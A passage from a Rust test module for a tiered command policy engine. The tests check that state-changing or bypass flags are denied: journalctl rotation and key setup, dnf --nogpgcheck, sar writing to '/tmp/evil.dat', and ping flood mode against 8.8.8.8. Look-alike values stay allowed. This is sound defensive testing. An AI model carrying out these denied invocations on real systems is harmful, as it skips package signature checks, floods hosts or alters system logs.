            vec!["--relin".to_string()],
            vec!["--sm".to_string()],
            vec!["--set".to_string()],
            vec!["--setu".to_string()],
            vec!["--vacuum-size=1M".to_string()],
        ] {
            assert!(
                matches!(engine.evaluate("journalctl", &denied), Decision::Denied(_)),
                "journalctl {denied:?} should be denied under the safe tier"
            );
        }

        // Ordinary reads, including flags that share leading letters with
        // the denied ones, stay allowed.
        for allowed in [
            vec!["-u".to_string(), "sshd".to_string()],
            vec!["--since".to_string(), "today".to_string()],
            vec!["--follow".to_string(), "--no-pager".to_string()],
            vec!["--reverse".to_string(), "--full".to_string()],
            vec!["--system".to_string(), "--utc".to_string()],
            vec!["--root=/mnt/other".to_string()],
            vec!["--file".to_string(), "/var/log/journal/x".to_string()],
        ] {
            assert!(
                matches!(engine.evaluate("journalctl", &allowed), Decision::Allowed),
                "journalctl {allowed:?} should be allowed under the safe tier"
            );
        }
    }

    #[test]
    fn standard_tier_denies_dnf_bypass_flags_at_token_start_but_allows_a_value_that_merely_contains_the_substring(
    ) {
        // The alternation is anchored to a `(?:^|\s)` token boundary, so a
        // value that merely *contains* `--nog`/`--repof`/`--set` mid-token
        // (rather than being the flag itself, at the start of a token) is no
        // longer denied. Each of these actually matched the old bare
        // substring pattern (verified by hand before writing this test), so
        // this is a real false-positive fix, not a contrived case that
        // never would have matched.
        let engine = PolicyEngine::new(rules_for_tier(&TierName::Standard));
        for allowed in [
            vec!["install".to_string(), "foo--nogfoo".to_string()],
            vec![
                "install".to_string(),
                "lib--repofrompath-compat".to_string(),
            ],
            vec!["install".to_string(), "mypkg--set=1".to_string()],
        ] {
            assert!(
                matches!(engine.evaluate("dnf", &allowed), Decision::Allowed),
                "dnf {allowed:?} should be allowed under the standard tier \
                 (substring, not a token-start flag)"
            );
        }

        // The anchored form still denies the real flags at a token start.
        assert!(matches!(
            engine.evaluate(
                "dnf",
                &["install".into(), "--nogpgcheck".into(), "foo".into()]
            ),
            Decision::Denied(_)
        ));
    }

    #[test]
    fn safe_tier_denies_journalctl_flags_at_token_start_but_allows_a_value_that_merely_contains_the_substring(
    ) {
        // Same anchoring fix as the dnf constant above, applied to
        // JOURNALCTL_MUTATION_FLAGS. Each of these actually matched the old
        // bare substring pattern (verified by hand before writing this
        // test).
        let engine = PolicyEngine::new(rules_for_tier(&TierName::Safe));
        for allowed in [
            vec!["myunit--rotate".to_string()],
            vec!["unit--flush".to_string()],
            vec!["svc--syncme".to_string()],
            vec!["abc--relinquish".to_string()],
            vec!["x--smtest".to_string()],
            vec!["y--setup-keys".to_string()],
        ] {
            assert!(
                matches!(engine.evaluate("journalctl", &allowed), Decision::Allowed),
                "journalctl {allowed:?} should be allowed under the safe tier \
                 (substring, not a token-start flag)"
            );
        }

        // The anchored form still denies the real flags at a token start.
        assert!(matches!(
            engine.evaluate("journalctl", &["--rotate".into()]),
            Decision::Denied(_)
        ));
    }

    #[test]
    fn safe_tier_denies_journalctl_update_catalog() {
        // `--update-catalog` writes to `/var/lib/systemd/catalog`, the same
        // "this mutates state" class the rest of JOURNALCTL_MUTATION_FLAGS
        // closes, but it wasn't previously covered.
        let engine = PolicyEngine::new(rules_for_tier(&TierName::Safe));
        assert!(matches!(
            engine.evaluate("journalctl", &["--update-catalog".into()]),
            Decision::Denied(_)
        ));
        assert!(matches!(
            engine.evaluate("journalctl", &["--upd".into()]),
            Decision::Denied(_)
        ));
    }

    #[test]
    fn safe_tier_denies_journalctl_setup_keys() {
        let engine = PolicyEngine::new(rules_for_tier(&TierName::Safe));
        assert!(matches!(
            engine.evaluate("journalctl", &["--setup-keys".into()]),
            Decision::Denied(_)
        ));
    }

    #[test]
    fn safe_tier_allows_vmstat_for_monitoring() {
        let engine = PolicyEngine::new(rules_for_tier(&TierName::Safe));
        assert!(matches!(
            engine.evaluate("vmstat", &["1".into()]),
            Decision::Allowed
        ));
    }

    #[test]
    fn safe_tier_allows_batch_mode_top_but_not_interactive_top() {
        let engine = PolicyEngine::new(rules_for_tier(&TierName::Safe));
        assert!(matches!(
            engine.evaluate("top", &["-b".into(), "-n".into(), "1".into()]),
            Decision::Allowed
        ));
        assert!(matches!(engine.evaluate("top", &[]), Decision::Denied(_)));
    }

    #[test]
    fn safe_tier_allows_sar_but_denies_its_file_output_flag() {
        let engine = PolicyEngine::new(rules_for_tier(&TierName::Safe));
        assert!(matches!(
            engine.evaluate("sar", &["1".into(), "10".into()]),
            Decision::Allowed
        ));
        assert!(matches!(
            engine.evaluate("sar", &["-o".into(), "/tmp/evil.dat".into(), "1".into()]),
            Decision::Denied(_)
        ));
    }

    #[test]
    fn safe_tier_denies_sars_attached_form_output_flag_but_allows_a_legitimate_flag() {
        // sar accepts the output path attached with no separator
        // (`-ofile.dat`), the same clustered-short-option shape
        // PING_ABUSE_FLAGS was hardened against. A trailing `\b` on the
        // deny pattern would miss this form since `o` and the following
        // filename character are both word characters.
        let engine = PolicyEngine::new(rules_for_tier(&TierName::Safe));
        assert!(matches!(
            engine.evaluate("sar", &["-ofile.dat".into(), "1".into(), "5".into()]),
            Decision::Denied(_)
        ));
        // The existing space-separated form still works.
        assert!(matches!(
            engine.evaluate("sar", &["-o".into(), "/tmp/evil.dat".into()]),
            Decision::Denied(_)
        ));
        // A legitimate sar flag that does not begin with `o` is unaffected.
        assert!(matches!(
            engine.evaluate("sar", &["-u".into(), "1".into(), "5".into()]),
            Decision::Allowed
        ));
    }

    #[test]
    fn the_monitoring_allow_rules_are_inherited_by_the_standard_tier() {
        let engine = PolicyEngine::new(rules_for_tier(&TierName::Standard));
        assert!(matches!(
            engine.evaluate("vmstat", &["1".into()]),
            Decision::Allowed
        ));
    }

    #[test]
    fn the_safe_tier_denials_are_inherited_by_the_standard_tier() {
        // `standard_rules()` builds on `safe_rules()`, so a regression that
        // reordered or dropped the inherited denies would show up here.
        let engine = PolicyEngine::new(rules_for_tier(&TierName::Standard));
        assert!(matches!(
            engine.evaluate("ping", &["-f".into(), "8.8.8.8".into()]),
            Decision::Denied(_)
        ));
        assert!(matches!(
            engine.evaluate("journalctl", &["--setup-keys".into()]),
            Decision::Denied(_)
        ));
    }
}
